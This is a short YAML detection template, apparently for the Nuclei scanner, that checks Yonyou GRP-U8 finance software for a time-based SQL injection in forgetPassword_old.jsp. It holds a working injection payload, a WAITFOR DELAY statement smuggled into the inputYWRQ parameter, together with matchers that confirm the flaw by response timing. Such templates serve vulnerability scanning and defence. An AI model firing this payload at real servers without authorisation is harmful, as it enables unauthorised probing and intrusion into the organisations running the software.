id: poc-yaml-yongyou-grp-u8-forgetpassword-oldjsp-sqli
info:
  name: 用友GRP-U8 forgetPassword_old.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection,两高一弱
  metadata:
    reference: []

variables:
  t1: "{{rand_int(5, 8)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - method: GET
    path:
      - "/u8qx/forgetPassword_old.jsp?action=save&idCard=1&userName=1&inputDW=1&inputYWRQ=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "用友GRP-U8 行政财务管理软件-忘记密码"
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < t2"
